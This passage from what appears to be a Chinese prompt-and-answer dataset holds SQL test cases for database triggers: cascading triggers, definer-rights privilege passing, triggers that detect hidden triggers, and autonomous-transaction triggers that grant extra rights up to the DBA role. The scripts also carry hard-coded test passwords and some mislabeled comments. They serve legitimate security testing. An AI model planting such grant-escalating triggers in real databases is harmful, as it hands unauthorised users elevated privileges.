BEGIN 
 UPDATE t1 SET age = NEW.income / 1000 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
UPDATE t1 SET age = 13 WHERE id = 1;
UPDATE t2 SET income = 12000 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1更新后触发器，触发器2更新后触发器,"’--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_upa_t1
AFTER UPDATE ON t1
FOR EACH ROW 
BEGIN 
 UPDATE t2 SET income = NEW.age * 1000 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_upa_t2
AFTER UPDATE ON t2
FOR EACH ROW 
BEGIN 
 UPDATE t1 SET age = NEW.income / 1000 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
UPDATE t1 SET age = 13 WHERE id = 1;
UPDATE t2 SET income = 12000 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1删除前触发器，触发器2删除前触发器,"--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_del_t1
BEFORE DELETE ON t1
FOR EACH ROW 
BEGIN 
 DELETE FROM t2 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_del_t2
BEFORE DELETE ON t2
FOR EACH ROW 
BEGIN 
 DELETE FROM t1 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
DELETE FROM t1 WHERE id = 1;
DELETE FROM t2 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1删除前触发器，触发器2删除后触发器,"--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_del_t1
BEFORE DELETE ON t1
FOR EACH ROW 
BEGIN 
 DELETE FROM t2 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_del_t2
AFTER DELETE ON t2
FOR EACH ROW 
BEGIN 
 DELETE FROM t1 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
DELETE FROM t1 WHERE id = 1;
DELETE FROM t2 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1删除后触发器，触发器2删除后触发器,"--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_del_t1
AFTER DELETE ON t1
FOR EACH ROW 
BEGIN 
 DELETE FROM t2 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_del_t2
AFTER DELETE ON t2
FOR EACH ROW 
BEGIN 
 DELETE FROM t1 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
DELETE FROM t1 WHERE id = 1;
DELETE FROM t2 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
,,
生成一组测试用例，能够展示触发器可以传递权限,user2用户拥有user1用户表的插入、查询权限，user1用户创建插入前触发器，在触发器中执行删除操作，user2执行插入操作，触发删除操作，user2用户本没有删除表权限，但是通过触发器执行成功,"‘--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的插入、查询权限
GRANT INSERT,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER INSERT_TABLE1_1
BEFORE INSERT ON TABLE1
FOR EACH ROW
BEGIN
    DELETE FROM TABLE1 WHERE ID = 1;
END;

--user2用户
--测试插入数据
INSERT INTO user1.TABLE1 VALUES(3,'user2');

--查询结果
SELECT * FROM user1.table1;"
生成一组测试用例，能够展示触发器可以传递权限,user2用户拥有user1用户表的插入、查询权限，user1用户创建插入前触发器，在触发器中执行更新操作，user2执行插入操作，触发更新操作，user2用户本没有更新表权限，但是通过触发器执行成功,"--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的插入、查询权限
GRANT INSERT,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER INSERT_TABLE1_2
BEFORE INSERT ON TABLE1
FOR EACH ROW
BEGIN
    UPDATE table1 SET name  = 'user2' WHERE id = 1;
END;

--user2用户
--测试插入数据
INSERT INTO user1.TABLE1 VALUES(3,'user2');

--查询结果
SELECT * FROM user1.table1;"
生成一组测试用例，能够展示触发器可以传递权限,user2用户拥有user1用户表的更新、查询权限，user1用户创建更新前触发器，在触发器中执行插入操作，user2执行更新操作，触发插入操作，user2用户本没有插入表权限，但是通过触发器执行成功,"--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的更新、查询权限
GRANT UPDATE,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER UPDATE_TABLE1_1
BEFORE UPDATE ON TABLE1
FOR EACH ROW
BEGIN
    INSERT INTO table1 VALUES (OLD.id, NEW.name);
END;

--user2用户
--测试更新数据
UPDATE user1.table1 SET name  = 'user2' WHERE id = 1;

--查询
SELECT * FROM user1.table1;"
生成一组测试用例，能够展示触发器可以传递权限,user2用户拥有user1用户表的更新、查询权限，user1用户创建更新前触发器，在触发器中执行删除操作，user2执行更新操作，触发删除操作，user2用户本没有删除表权限，但是通过触发器执行成功,"‘--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的更新、查询权限
GRANT UPDATE,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER UPDATE_TABLE1_2
BEFORE UPDATE ON TABLE1
FOR EACH ROW
BEGIN
    DELETE FROM TABLE1 WHERE id = 1;
END;

--user2用户
--测试更新数据，与触发器中的值不一致
UPDATE user1.table1 SET name  = 'user2' WHERE id = 2;

--查询
SELECT * FROM user1.table1;"
生成一组测试用例，能够展示触发器可以传递权限,user2用户拥有user1用户表的删除、查询权限，user1用户创建删除前触发器，在触发器中执行插入操作，user2执行删除操作，触发插入操作，user2用户本没有插入表权限，但是通过触发器执行成功,"‘--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的删除、查询权限
GRANT DELETE,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER DELETE_TABLE1_1
BEFORE DELETE ON TABLE1
FOR EACH ROW
BEGIN
    INSERT INTO table1 VALUES (3, 'user2');
END;

--user2用户
--测试删除数据
DELETE FROM user1.table1 WHERE id = 1;

--查询
SELECT * FROM user1.table1;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的删除、查询权限，user1用户创建删除前触发器，在触发器中执行更新操作，user2执行删除操作，触发更新操作，user2用户本没有更新表权限，但是通过触发器执行成功,"--user1用户
--创建表
CREATE TABLE table1 (id int, name varchar(20));

--插入数据
INSERT INTO table1 values(1,'user1');
INSERT INTO table1 values(2,'user1');

--授予user2用户表table1的删除、查询权限
GRANT DELETE,SELECT ON TABLE1 TO USER2;

--创建插入前触发器
CREATE OR REPLACE TRIGGER DELETE_TABLE1_2
BEFORE DELETE ON TABLE1
FOR EACH ROW
BEGIN
 UPDATE user1.table1 SET name  = 'user2' WHERE id = 2;
END;

--user2用户
--测试删除数据
DELETE FROM user1.table1 WHERE id = 1;

--查询
SELECT * FROM user1.table1;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的插入权限，user1用户创建插入前触发器，在触发器中执行授权操作，user2执行操作操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
--授予user2用户表的插入权限
GRANT INSERT ON user1.table1 TO user2;

--创建触发器
CREATE OR REPLACE TRIGGER before_insert_grant
BEFORE INSERT ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT SELECT ON user1.table1 TO user2';
END;

--user2用户
--测试插入数据
INSERT INTO user1.TABLE1 VALUES(1,'user2');

--拥有查询权限
SELECT * FROM user1.table1;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的插入权限，user1用户创建插入后触发器，在触发器中执行授权操作，user2执行操作操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
--授予user2用户表的插入权限
GRANT INSERT ON user1.table1 TO user2;

--创建触发器
CREATE OR REPLACE TRIGGER after_insert_grant
AFTER INSERT ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT SELECT ON user1.table1 TO user2';
END;

--user2用户
--测试插入数据
INSERT INTO user1.TABLE1 VALUES(1,'user2');

--拥有查询权限
SELECT * FROM user1.table1;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的更新、查询权限，user1用户创建更新前触发器，在触发器中执行授权操作，user2执行更新操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
CREATE TABLE user1.table2 (id INT, value VARCHAR(100));

--授予user2用户表的更新、查询权限
GRANT UPDATE,SELECT ON user1.table1 TO user2;

--插入数据
INSERT INTO table1 values(1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER before_update_grant
BEFORE UPDATE ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT insert ON user1.table2 TO user2';
END;

--user2用户
--测试更新数据
UPDATE user1.table1 SET value = 'user2' WHERE id = 1;

--拥有插入权限
INSERT INTO user1.table2 VALUES(1,'user2');"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的更新、查询权限，user1用户创建更新后触发器，在触发器中执行授权操作，user2执行更新操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
CREATE TABLE user1.table2 (id INT, value VARCHAR(100));

--授予user2用户表的更新、查询权限
GRANT UPDATE,SELECT ON user1.table1 TO user2;

--插入数据
INSERT INTO table1 values(1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER after_update_grant
AFTER UPDATE ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT insert ON user1.table2 TO user2';
END;

--user2用户
--测试更新数据
UPDATE user1.table1 SET value = 'user2' WHERE id = 1;

--拥有插入权限
INSERT INTO user1.table2 VALUES(1,'user2');"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的删除、查询权限，user1用户创建删除前触发器，在触发器中执行授权操作，user2执行删除操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
CREATE TABLE user1.table2 (id INT, value VARCHAR(100));

--授予user2用户表的删除、查询权限
GRANT DELETE, SELECT ON user1.table1 TO user2;

--插入数据
INSERT INTO table1 values(1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER before_delete_grant
BEFORE DELETE ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT SELECT ON user1.table2 TO user2';
END;

--user2用户
--测试删除数据
DELETE FROM user1.TABLE1 WHERE id = 1;

--拥有查询权限
SELECT * FROM user1.table2;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的删除、查询权限，user1用户创建删除后触发器，在触发器中执行授权操作，user2执行删除操作，触发授权操作，拥有了额外的权限,"‘--user1用户
--创建表
CREATE TABLE user1.table1 (id INT, value VARCHAR(100));
CREATE TABLE user1.table2 (id INT, value VARCHAR(100));

--授予user2用户表的删除、查询权限
GRANT DELETE, SELECT ON user1.table1 TO user2;

--插入数据
INSERT INTO table1 values(1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER after_delete_grant
AFTER DELETE ON user1.table1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT SELECT ON user1.table2 TO user2';
END;

--user2用户
--测试删除数据
DELETE FROM user1.TABLE1 WHERE id = 1;

--拥有查询权限
SELECT * FROM user1.table2;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的插入权限，user1用户创建插入前触发器，在触发器中执行创建表语句，user2用户执行插入操作，触发执行创表命令,"‘--user1用户
--创建表
CREATE TABLE table2(id int, name varchar(20));
--授予user2用户表的插入权限
GRANT INSERT ON table2 TO user2;

--创建触发器
CREATE OR REPLACE TRIGGER tri
BEFORE INSERT ON table2
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'CREATE TABLE table3(id int, uid int)';
 EXECUTE IMMEDIATE'GRANT SELECT ON table3 TO user2';
END;

--user2用户
INSERT INTO user1.table2 VALUES(1,'user2');

--查询结果
SELECT * FROM user1.table3;"
生成一组测试用例，能够通过触发器授予权限,user2用户拥有user1用户表的插入权限，user1用户创建插入后触发器，在触发器中执行授权表所有权限语句，user2用户执行插入操作，触发命令，拥有表的基本权限,"‘--user1用户
--创建表
CREATE TABLE table4(id int, name varchar(20));
--授予user2用户表的插入权限
GRANT INSERT ON table4 TO user2;

--创建触发器
CREATE OR REPLACE TRIGGER AFTER_insert_grant_all
AFTER INSERT ON table4
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT ALL PRIVILEGES ON user1.table4 TO user2';
END;

--user2用户
--插入数据
INSERT INTO user1.table4 VALUES(1,'user2');

--添加新列
ALTER TABLE user1.table4 ADD new_column VARCHAR(100);

--查询结果
SELECT * FROM user1.table4;"
生成一组测试用例，能够通过触发器授予权限,user1用户是DBA用户，将表的更新、查询权授予用户，通过创建更新前触发器，授予user2用户任意创建触发器权限，user2用户更新表以触发触发器，获得权限,"‘--user1用户
--创建表
CREATE TABLE table5(id int, name varchar(20));

--授予user2用户表的更新、查询权限
GRANT UPDATE,SELECT ON table5 TO user2;

--插入数据
INSERT INTO table5 VALUES (1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER before_update_grant
BEFORE UPDATE ON table5
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT CREATE ANY TRIGGER TO USER2';
END;

--user2用户
--更新数据
UPDATE user1.table5 SET name = 'user2' WHERE id = 1;

--查询具有的权限
select * from user_sys_privs;"
生成一组测试用例，能够通过触发器授予权限,user1用户是DBA用户，将表的更新、查询权授予用户，通过创建更新后触发器，授予user2用户创建视图权限，user2用户更新表以触发触发器，获得权限,"‘--user1用户
--创建表
CREATE TABLE table7(id int, name varchar(20));

--授予user2用户表的更新、查询权限
GRANT UPDATE,SELECT ON table7 TO user2;

--插入数据
INSERT INTO table7 VALUES (1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER after_update_grant
AFTER UPDATE ON table7
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT CREATE VIEW TO USER2';
END;

--user2用户
--更新数据
UPDATE user1.table7 SET name = 'user2' WHERE id = 1;

--查询具有的权限
select * from user_sys_privs;"
生成一组测试用例，能够通过触发器授予权限,user1用户是DBA用户，将表的删除、查询权授予用户，通过创建删除前触发器，授予user2用户修改数据库权限，user2用户删除表以触发触发器，获得权限,"‘--user1用户
--创建表
CREATE TABLE table8(id int, name varchar(20));

--授予user2用户表的删除、查询权限
GRANT DELETE, SELECT ON table8 TO user2;

--插入数据
INSERT INTO table8 VALUES (1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER before_delete_grant
BEFORE DELETE ON table8
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT ALTER DATABASE TO USER2';
END;

--user2用户
--删除数据
DELETE FROM user1.table8 WHERE id = 1;

--查询具有的权限
select * from user_sys_privs;"
生成一组测试用例，能够通过触发器授予权限,user1用户是DBA用户，将表的删除、查询权授予用户，通过创建删除后触发器，授予user2用户创建表空间权限，user2用户删除表以触发触发器，获得权限,"‘--user1用户
--创建表
CREATE TABLE table9(id int, name varchar(20));

--授予user2用户表的插入权限
GRANT DELETE, SELECT ON table9 TO user2;

--插入数据
INSERT INTO table9 VALUES (1,'user1');

--创建触发器
CREATE OR REPLACE TRIGGER after_delete_grant
AFTER DELETE ON table9
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT create tablespace TO USER2';
END;

--user2用户
--删除数据
DELETE FROM user1.table9 WHERE id = 1;

--查询具有的权限
select * from user_sys_privs;"
生成一组测试用例，能够通过触发器授予权限,user1用户是DBA用户，通过创建插入型触发器，将表的插入权授予用户，在触发器中执行授权语句，user2用户插入表以触发触发器，执行授权语句，成为DBA用户,"--user1用户
--创建表
CREATE TABLE table4(id int, name varchar(20));
--授予user2用户表的插入权限
GRANT INSERT ON table4 TO user2;

--创建触发器
DROP TRIGGER tri;
CREATE OR REPLACE TRIGGER tri
BEFORE INSERT ON table4
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE'GRANT DBA TO USER2';
END;

--user2用户
INSERT INTO user1.table4 VALUES(1,'user2');

--查询结果
SELECT * FROM user_role_privs;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的插入权限，通过创建插入型触发器，在触发器中执行插入到user2用户的表，那么当user2用户通过插入数据到user1用户表时，触发触发器，插入数据到自己表中，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2 (ID INT, NAME VARCHAR(20));

--授予USER1用户表L2的插入权限
GRANT INSERT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));

--授予USER2用户表L1的插入权限
GRANT INSERT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER INSERT_TO_INSERT
AFTER INSERT ON L1
FOR EACH ROW 
BEGIN
 INSERT INTO USER2.L2 VALUES(NEW.ID,NEW.NAME);
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--插入数据，以触发触发器
INSERT INTO USER1.L1 VALUES(1,'USER2');
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的更新权限，通过创建插入型触发器，在触发器中执行更新user2用户的表中的数据，那么当user2用户通过插入数据到user1用户表时，触发触发器，更新表中的数据，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2 (ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表L2的更新权限
GRANT UPDATE ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));

--授予USER2用户表L1的插入权限
GRANT INSERT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER INSERT_TO_UPDATE
AFTER INSERT ON L1
FOR EACH ROW 
BEGIN
 UPDATE USER2.L2 SET NAME = 'USER1' WHERE ID = NEW.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--插入数据，以触发触发器
INSERT INTO USER1.L1 VALUES(1,'USER2');
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的删除权限，通过创建插入型触发器，在触发器中执行删除user2用户的表中的数据，那么当user2用户通过插入数据到user1用户表时，触发触发器，删除表中的数据，那么该用户可以间接的知道触发器的存在,"--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2 (ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表L2的更新权限
GRANT DELETE ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));

--授予USER2用户表L1的插入权限
GRANT INSERT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER INSERT_TO_DELETE
AFTER INSERT ON L1
FOR EACH ROW 
BEGIN
 DELETE FROM USER2.L2 WHERE ID = NEW.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--插入数据，以触发触发器
INSERT INTO USER1.L1 VALUES(1,'USER2');
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的插入权限，通过创建更新型触发器，在触发器中执行插入到user2用户的表，那么当user2用户通过更新user1用户表时，触发触发器，插入数据到表中，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));

--授予USER1用户表L2的插入权限
GRANT INSERT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的更新、查询权限
GRANT UPDATE,SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_TO_INSERT
AFTER UPDATE ON L1
FOR EACH ROW 
BEGIN
 INSERT INTO USER2.L2 VALUES(NEW.ID,NEW.NAME);
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--更新数据，以触发触发器
UPDATE USER1.L1 SET NAME = 'USER2' WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的更新权限，通过创建更新型触发器，在触发器中执行更新user2用户的表中的数据，那么当user2用户通过更新user1用户表时，触发触发器，更新表中的数据，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表L2的更新权限
GRANT UPDATE,SELECT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的更新、查询权限
GRANT UPDATE,SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_TO_UPDATE
AFTER UPDATE ON L1
FOR EACH ROW 
BEGIN
 UPDATE USER2.L2 SET NAME = 'USER1' WHERE ID = NEW.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--更新数据，以触发触发器
UPDATE USER1.L1 SET NAME = 'USER2' WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的删除权限，通过创建更新型触发器，在触发器中执行删除user2用户的表中的数据，那么当user2用户通过更新user1用户表时，触发触发器，删除表的数据，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表L2的删除权限
GRANT DELETE,SELECT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的更新、查询权限
GRANT UPDATE,SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_TO_DELETE
AFTER UPDATE ON L1
FOR EACH ROW 
BEGIN
 DELETE FROM USER2.L2 WHERE ID = NEW.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--更新数据，以触发触发器
UPDATE USER1.L1 SET NAME = 'USER2' WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的插入权限，通过创建删除型触发器，在触发器中执行插入到user2用户的表，那么当user2用户通过删除user1用户表时，触发触发器，插入数据到表中，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));

--授予USER1用户表L2的插入权限
GRANT INSERT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的删除、查询权限
GRANT DELETE, SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER DELETE_TO_INSERT
AFTER DELETE ON L1
FOR EACH ROW 
BEGIN
 INSERT INTO USER2.L2 VALUES(OLD.ID, OLD.NAME);
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--删除数据，以触发触发器
DELETE FROM USER1.L1 WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的更新权限，通过创建删除型触发器，在触发器中执行更新user2用户的表中的数据，那么当user2用户通过删除user1用户表时，触发触发器，更新表中的数据，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表更新权限
GRANT UPDATE, SELECT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的删除、查询权限
GRANT DELETE, SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER DELETE_TO_UPDATE
AFTER DELETE ON L1
FOR EACH ROW 
BEGIN
 UPDATE USER2.L2 SET NAME = 'USER1' WHERE ID = OLD.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--删除数据，以触发触发器
DELETE FROM USER1.L1 WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
SELECT * FROM USER2.L2;"
生成一组测试用例，能够发现触发器的存在,user1用户拥有user2用户表的删除权限，通过创建删除型触发器，在触发器中执行删除user2用户的表中的数据，那么当user2用户通过删除user1用户表时，触发触发器，删除表中的数据，那么该用户可以间接的知道触发器的存在,"‘--USER2用户--
CONNECT USER2/123456789;
--创建表
CREATE TABLE L2(ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L2 VALUES(1,'USER2'), (2,'USER2');

--授予USER1用户表删除权限
GRANT DELETE, SELECT ON L2 TO USER1;

---USER1用户--
CONNECT USER1/123456789;
--创建表
CREATE TABLE L1 (ID INT, NAME VARCHAR(20));
--插入数据
INSERT INTO L1 VALUES(1,'USER1'), (2,'USER1');

--授予USER2用户表L1的删除、查询权限
GRANT DELETE, SELECT ON L1 TO USER2;

--创建触发器
CREATE OR REPLACE TRIGGER DELETE_TO_DELETE
AFTER DELETE ON L1
FOR EACH ROW 
BEGIN
 DELETE FROM USER2.L2 WHERE ID = OLD.ID;
END;

--USER2用户
CONNECT USER2/123456789;
--查询表中数据
SELECT * FROM USER2.L2;
--删除数据，以触发触发器
DELETE FROM USER1.L1 WHERE ID = 1;
--再次查询表中数据，对比两次执行结果
